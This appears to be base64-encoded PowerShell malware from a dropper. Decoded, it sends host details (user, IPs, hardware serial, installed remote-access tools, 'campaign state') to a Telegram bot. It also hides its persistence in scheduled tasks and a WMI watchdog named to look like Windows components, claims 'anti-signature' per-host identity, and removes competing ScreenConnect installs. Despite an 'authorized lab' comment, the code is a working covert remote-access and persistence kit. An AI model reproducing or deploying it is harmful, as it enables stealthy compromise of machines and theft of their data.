aCAkdC5OYW1lCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsKICAgICAgICAk
dGFza09rKysKICAgICAgICAkbWFyayA9ICdPSycKICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1h
bmQgLW5vdCAkaC5PdXJzKSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ05P
VF9PVVJTJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsKICAgICAgICAkdGFza0JhZCsrCiAg
ICAgICAgJG1hcmsgPSAnV0VBSycKICAgIH0gZWxzZSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAg
ICAgICRtYXJrID0gJ01JU1NJTkcnCiAgICB9CiAgICAkZXh0cmEgPSAnJwogICAgaWYgKCRoLlBy
ZXNlbnQpIHsKICAgICAgICAkYml0cyA9IEAoKQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJp
dHMgKz0gJGguU3RhdHVzIH0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJl
c3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9CiAg
ICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywg
JykgKyAnKScgfQogICAgfQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2Rl
PnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJv
bGUpLCAoRXNjICRleHRyYSkpKQp9CgokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQokYWx0
TGluZSA9IEdldC1TdmNMaW5lICRhbHQKJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmlu
ZyonCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
CgokZW1vamlNYXAgPSBAewogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpCiAg
ICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkK
ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIp
KQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpCiAgICBGT1JDRSAgICA9IFtz
dHJpbmddKFtjaGFyXTB4MjZBMSkKICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252
ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNv
bnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpCn0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50
KCkKJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBb
JGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEp
KSB9CgokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsKICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5
JyB9CiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQogICAgJ1JFU1RPUkVE
JyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9CiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0KICAg
ICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQogICAgJ0RFUExPWScgeyBpZiAoJGRlcGxv
eU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBO
RUVERUQnIH0gfQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9CiAgICBkZWZhdWx0IHsgIlN0
YXRlOiAkU3RhdGUiIH0KfQoKJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRlIC0+
ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzCiRybW1I
aXRzID0gR2V0LVJtbUhpdHMKaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1I
aXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9CgokcHViID0gR2V0LVB1YmxpY0lwCiRsYW4g
PSBHZXQtTG9jYWxJcHMKJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06
c3Mgenp6JwokdXB0aW1lID0gJ24vYScKdHJ5IHsKICAgICRib290ID0gKEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lCiAgICAkdXB0aW1lID0gJ3sw
OmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQp9IGNhdGNoIHt9
CgojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0
aW9uKQokc3RhdGVMaW5lID0gJ24vYScKJHN0YXRlT2JqID0gJG51bGwKJHN0YXRlUGF0aDIgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIp
IHsKICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIg
LVJhdykuVHJpbSgpCiAgICB0cnkgewogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENv
bnZlcnRGcm9tLUpzb24KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWln
bikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQogICAgICAg
ICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0
KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3Rh
dGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRl
T2JqLmluc3RhbGxDb3VudCkiCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9
Cn0KCiRkZXBsb3lCbG9jayA9ICcnCmlmICgka2V5IC1lcSAnREVQTE9ZJykgewogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBh
dGggIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bm90bWF0Y2ggKCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
LUdyeXhhS2VlcEZwKSkgfSkKICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xs
ZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlf
JywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywKICAgICAgICAg
ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAn
aWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29y
cGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nCiAgICAgICAgKQogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgJGxp
bmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlm
ICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgICAgICAgICAg
JGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0g
PGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/
JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRp
YWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0K
ICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBsb3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxi
PiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsg
J1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBt
b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNl
IHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tz
LkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFkKQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTog
TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIg
Y3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBu
IikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8
L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9u
OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgotIFdoZW46ICQoRXNjICRub3cpCi0gU291cmNl
IGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8
L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4KLSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06
ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3
b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDog
PGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5PUyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVz
YyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNj
ICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxs
RGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1
cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZh
Y3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFs
KTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFNX0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlz
a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5l
Y3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNj
ICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQotIEdyeXhhIDxjb2RlPiQoRXNjIChHZXQtR3J5eGFLZWVwRnApKTwvY29kZT46ICQo
RXNjIChHZXQtU3ZjTGluZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdy
eXhhS2VlcEZwKSkpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJNTSAvIHJlbW90
ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9iPgotIE1TSSBj
YWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9j
b2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPgotIDxj
b2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4K
CjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPgoK
PGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAKCiMgY29tcGFj
dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE2CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTY6IE5FVkVSIHJlaW5z
dGFsbCBHcnl4YSB3aGVuIFJ1bm5pbmcgKHBhbmVsIGR1cGxpY2F0ZXMpOyBUQ1AgYWR2aXNvcnkg
b25seS4KIyBMMTU6IGdyeXhhLWhlYWx0aCAvIGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVj
ayAoVENQL3JlbGF5L0ZQIGRyaWZ0IHJlaW5zdGFsbCkuCiMgTDEzOiBzY2h0YXNrcyBDcmVhdGUg
dmlhIGNtZCAobGlrZSBXdWNhY2hlT3duKSwgVFIgdW5kZXIgV2luZG93c1xUZW1wXC53dWNhY2hl
CiMgICAgICAobm90IEFDTC1sb2NrZWQgUHJvZ3JhbURhdGEgcGF0aCksIC9TVCAwMDowMCBvbiBN
SU5VVEUsIG5vIGxlYWRpbmcgXC4KIyBMMTI6IElERU5UVkVSPTcgUk9PVC1sZXZlbCB0YXNrIG5h
bWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdpbmRvd3MgQWNjZXNzIERlbmllZCkuCiMgTDExOiBORVZF
UiByZXVzZSByZWFsIFdpbmRvd3MgYnVpbHQtaW4gdGFzayBuYW1lczsgVFIgb3duZXJzaGlwIGNo
ZWNrcy4KIyBBdXRob3JpemVkIGludGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24g
c2NvcGUgb25seS4KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKW0NtZGxldEJpbmRpbmcoKV0KcGFyYW0o
CiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZVNldCgnaW5p
dCcsICd3YXRjaGRvZycsICd3YXRjaGRvZy1lbnN1cmUnLCAndGFza3MtZW5zdXJlJywgJ3N0YXRl
JywgJ2lkZW50aXR5JywgJ3JlcGFpcicsICdyZWdpc3RlcmVkJywgJ2V4dGVybWluYXRlJywgJ2dy
eXhhLWhlYWx0aCcsICdncnl4YS1lbnN1cmUnKV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kTW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVp
bGQgID0gJ08xNScsCiAgICBbc3RyaW5nXSRFeHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAg
ICA9ICcnLAogICAgW3N3aXRjaF0kRGVlcCwKICAgIFtzd2l0Y2hdJEZvcmNlCikKCiRFcnJvckFj
dGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKJGNmZ1BhdGggPSBKb2luLVBhdGgg
JFdvcmtEaXIgJ2lkZW50aXR5LmNmZycKJElkZW50VmVyc2lvbiA9IDgKCiMgUm9vdC1sZXZlbCBu
YW1lcyBXSVRIT1VUIGxlYWRpbmcgYmFja3NsYXNoIChtYXRjaGVzIHdvcmtpbmcgV3VjYWNoZU93
biBzdHlsZSkuCiRQb29scyA9IEB7CiAgICBBID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RD
YWNoZScsJ05ldFRyYWNlQ2FjaGUnLCdXZGlIb3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFsdGgnLCdU
Y3BJcENvbmZsaWN0UmVzJywnU3JDYWNoZVN5bmMnLCdSZXNvbHV0aW9uUXVldWUnKQogICAgQiA9
IEAoJ1BsYVNlcnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRy
YWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hlJywnVGNwSXBDb25mbGljdFJlcycsJ1BsYVNlcnZlckRp
YWcnLCdTckNhY2hlU3luYycpCiAgICBDID0gQCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VD
YWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgn
LCdEaWFnSG9zdENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpCiAgICBEID0g
QCgnVGNwSXBDb25mbGljdFJlcycsJ1Jlc29sdXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdE
aWFnSG9zdENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhl
YWx0aCcsJ1dkaUhvc3RQcm94eScpCn0KJERlZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tf
QSA9ICdXZXJRdWV1ZVN5bmMnCiAgICBUQVNLX0IgPSAnUGxhU2VydmVySGVhbHRoJwogICAgVEFT
